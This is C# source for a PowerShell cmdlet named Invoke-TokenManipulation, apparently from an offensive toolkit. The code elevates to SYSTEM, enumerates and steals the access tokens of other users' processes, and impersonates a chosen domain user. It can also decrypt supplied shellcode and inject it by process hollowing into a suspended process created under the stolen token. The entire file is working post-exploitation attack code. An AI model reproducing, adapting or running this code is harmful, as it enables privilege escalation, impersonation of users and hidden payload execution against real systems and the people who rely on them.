using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using TurtleToolKitManaged;
using TurtleToolKitImpersonate;
using TurtleToolKitOutputs;
using System.Management.Automation;
using System.Runtime.InteropServices;
using TurtleToolKitCrypt;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "TokenManipulation")] // <- seeting cmdlet name and verbs
    [Alias("INVTKNM")] //<- cmdlet alias
    public class InvokeTokenManipulation : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("procH")] public bool procHollow { get; set; }
        [Parameter(Mandatory = false)] [Alias("e")] public string exe { get; set; }
        [Parameter(Mandatory = false)] [Alias("k")] public byte[] decryptKey { get; set; }
        [Parameter(Mandatory = false)] [Alias("encsh")] public byte[] shellCode { get; set; }
        [Parameter(Mandatory = false)] [Alias("ivk")] public byte[] initVector { get; set; }

        public static List<TokenObjects> tokensList;
        public static string exePath;
        // setting class parameters
        public static Cryptor cryptObj;
        public static byte[] payload;

        protected override void BeginProcessing(){
            base.BeginProcessing();
            tokensList = new List<TokenObjects>();
            if (procHollow)
            {
                exePath = exe;
                cryptObj = new Cryptor(decryptKey, initVector);
                payload = shellCode;
                return;
            }
            return;


        }
        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            EnumTokens();
            Console.WriteLine("### Total Usable Tokens Found {0} ###",tokensList.Count);
            Console.WriteLine("### Users List ###");
            PrintUsers();
            Console.Write("Enter a username to impersonate: ");
            string usr = Console.ReadLine();
            if (!ImpersonateUser(usr,procHollow))
            {
                WriteWarning("Failed to impersonate "+usr);
                FreeAllTokens();
                return;
            }
            FreeAllTokens();
            WriteWarning("Success");
            return;
        }
        protected override void EndProcessing() { base.EndProcessing(); }
        protected override void StopProcessing() { base.StopProcessing(); }

        public static void FreeAllTokens()
        {
            foreach (TokenObjects tObj in tokensList)
            {
                Win32.CloseHandle(tObj.tokenHandle);
            }
         }
        public static void PrintUsers()
        {
            List<string> usernames = new List<string>();
            foreach (TokenObjects t in tokensList)
            {
                if (!usernames.Contains(t.userName))
                {
                    usernames.Add(t.userName);
                    Console.WriteLine("{0}\\{1}",t.userDomain,t.userName);
                }
            }
        }
        public static bool GetTokenInformation(ref TokenObjects t)
        {
            IntPtr hToken = t.tokenHandle;
            uint TokenStatusLength = 0;
            bool Result;
            // first call gets lenght of TokenInformation
            Result = Win32.GetTokenInformation(hToken, Win32.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenStatusLength, out TokenStatusLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenStatusLength);
            Result = Win32.GetTokenInformation(hToken, Win32.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenStatusLength, out TokenStatusLength);
            if (!Result)
            {
                Console.WriteLine("Error getting token stats");
                return false;
            }
            // get logon session data
            Win32.TOKEN_STATISTICS TokenStats = (Win32.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Win32.TOKEN_STATISTICS));
            IntPtr LuidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Win32.TOKEN_STATISTICS)));
            Marshal.StructureToPtr(TokenStats.AuthenticationId, LuidPtr, false);
            IntPtr LogonSessionDataPTr = IntPtr.Zero;
            uint res = Win32.LsaGetLogonSessionData(LuidPtr, out LogonSessionDataPTr);
            if (res != 0 && LogonSessionDataPTr == IntPtr.Zero)
            {
                Console.WriteLine("error getting lsa logon session data");
                return false;
            }
            Win32.SECURITY_LOGON_SESSION_DATA LogonSessonData = (Win32.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(LogonSessionDataPTr, typeof(Win32.SECURITY_LOGON_SESSION_DATA));
            if (LogonSessonData.Username.Buffer != IntPtr.Zero && LogonSessonData.LoginDomain.Buffer != IntPtr.Zero)
            {
                string UserName = Marshal.PtrToStringUni(LogonSessonData.Username.Buffer, LogonSessonData.Username.Length/2);
                string UserDomain = Marshal.PtrToStringUni(LogonSessonData.LoginDomain.Buffer, LogonSessonData.LoginDomain.Length / 2);
                //Console.WriteLine(UserName);
                // disregard computer account all we care about is domain users really
                // at this point more stuff can be enumerated with GetTokenInformation
                // like if token is impersonation token or not
                // or if token is elevated etc
                // dont really care about that for now
                if (UserName == Environment.MachineName.ToString() + "$")
                {
                    Console.WriteLine("Skipping computer account");
                    return false;
                }
                // create return object?
                //Console.WriteLine("{0}\\{1} LogonType:{2}", UserDomain, UserName, LogonSessonData.LogonType);
                t.userName = UserName;
                t.userDomain = UserDomain;
                t.logonType = LogonSessonData.LogonType;
                return true;
            }
            return false;
        }
        public static bool ImpersonateUser(string userName,bool ui)
        {
            if (Impersonator.ElevateToSystem() != 0)
            {
                Console.WriteLine("Failed to get system before impersonating user");
                return false;
            }
            foreach (TokenObjects tObj in tokensList)
            {
                if (tObj.userName == userName)
                {
                    Console.WriteLine("{0}\\{1} -> {2}::{3}", tObj.userDomain, tObj.userName, tObj.procName,tObj.pid);
                    continue;
                } else
                {
                    continue;
                } 
            }
            Console.WriteLine("Pick a pid to steal token");
            int targetPid = Convert.ToInt32(Console.ReadLine());
            if (!ui)
            {
                if (!Impersonator.ImpersonateLoggedOnUserViaToken(targetPid))
                {
                    Console.WriteLine("err failed impersonate logged on user VIA TOKEN {0}", Marshal.GetLastWin32Error());
                    Impersonator.RevokePrivs();
                    return false;
                }
                return true;
            }
            // Create New Process
            Console.WriteLine("Attempting procHollow");
            if (!ExecuteProcessHollow(cryptObj, payload, targetPid, exePath))
            {
                Console.WriteLine("Failed proc hollow");
                Impersonator.RevokePrivs();
                return false;
            }
            /*
            if (!Impersonator.CreateProcessFromToken(targetPid, exePath))
            {
                Console.WriteLine("err failed impersonate logged on user VIA TOKEN {0}", Marshal.GetLastWin32Error());
                Impersonator.RevokePrivs();
                return false;
            }
            Impersonator.RevokePrivs();
            */
            Impersonator.RevokePrivs();
            return true;
            
        }
        private static bool ExecuteProcessHollow(Cryptor crypt, byte[] payloadBytes, int pid, string exepath)
        {
            var allAccessFlags = Win32.ProcessAccessFlags.All;
            IntPtr hProcess1 = Win32.OpenProcess((uint)allAccessFlags, true, pid);
            if (hProcess1 == IntPtr.Zero)
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }
            IntPtr hToken;
            if (!Win32.OpenProcessToken(hProcess1, Win32.TOKEN_ASSIGN_PRIMARY | Win32.TOKEN_QUERY | Win32.TOKEN_IMPERSONATE | Win32.TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                return false;
            }

            IntPtr DuplicatedToken = new IntPtr();
            if (!Win32.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            // impersonate logged on user with duplicated token
            Win32.CloseHandle(hToken);
            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
            if (!Win32.DuplicateTokenEx(hToken, (uint)0x02000000L, IntPtr.Zero, 2, 1, out DuplicatedToken))
            {
                Console.WriteLine("Failed to dupe token {0}", Marshal.GetLastWin32Error());
                return false;
            }
            //if (!DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED -> 0x02000000L, NULL, seImpersonateLevel  = 2, tokenType TOKENPRIMARY = 1, &newToken))
            //ret = CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY = 2, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE NEW CONSOLE 10, NULL, NULL, &si, &pi);
            // bool res = TurtleToolKitManaged.Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            if (!Win32.CreateProcessWithTokenW(DuplicatedToken, Win32.LogonFlags.NetCredentialsOnly, exepath, null, Win32.CreationFlags.Suspended, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("Failed to create process {0}", Marshal.GetLastWin32Error());
                return false;
            }
            TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION bi = new TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            Console.WriteLine(pi.dwProcessId);

            TurtleToolKitManaged.Win32.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            Console.WriteLine(nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            var decryptedBytes = crypt.DecryptBytes(payloadBytes);
            if (decryptedBytes == null)
            {
                Console.WriteLine("Failed to decrypt bytes");
                return false;
            }
            // Perform Decrypt heres
            TurtleToolKitManaged.Win32.WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedBytes, decryptedBytes.Length, out nRead);
            TurtleToolKitManaged.Win32.ResumeThread(pi.Thread);
            Console.WriteLine("::: Successfully Execute ProcessHollow via -> {0} :::", exepath);
            Win32.CloseHandle(hProcess);
            Win32.CloseHandle(DuplicatedToken);
            return true;
        }
        public static bool EnumTokens()
        {
            if (Impersonator.ElevateToSystem() != 0)
            {
                Console.WriteLine("Failed to impersonate system token...needed for token enumertation");
                return false;
            }
            // continue with token enum
            Process[] procs = Process.GetProcesses();
            IntPtr hToken;
            IntPtr hProcess;
            foreach (Process p in procs)
            {
                if (p.ProcessName != "csrss" && p.Id != 0 && p.ProcessName != "system" && p.ProcessName != "System") 
                {
                    //Console.WriteLine("{0} -> {1}", p.Id, p.ProcessName);
                    // get primary token
                    hProcess = Win32.OpenProcess((uint)Win32.ProcessAccessFlags.All, true, p.Id);
                    if (hProcess == IntPtr.Zero)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                        continue;
                    }

                    if (!Win32.OpenProcessToken(hProcess, Win32.TOKEN_ALL_ACCESS, out hToken))
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("err {0}", Marshal.GetLastWin32Error());
                        continue;
                    }
                    if (hToken == IntPtr.Zero)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("Failed to get handle to token");
                        continue;
                    }
                    //Get-TokenInformation
                    TokenObjects t = new TokenObjects();
                    t.processHandle = hProcess;
                    t.tokenHandle = hToken;
                    t.pid = p.Id;
                    t.procName = p.ProcessName;
                    bool res = GetTokenInformation(ref t);
                    if (!res)
                    {
                        Win32.CloseHandle(hProcess);
                        Console.WriteLine("Failed to fill token object");
                        continue;
                    }
                    // if token filled add to list
                    Win32.CloseHandle(hProcess);
                    tokensList.Add(t);
                    // dont close token handle cause we need it to impersonate user
                    //Win32.CloseHandle(hToken);
                }
            }
            Impersonator.RevokePrivs();
            return true;
        }
    }
}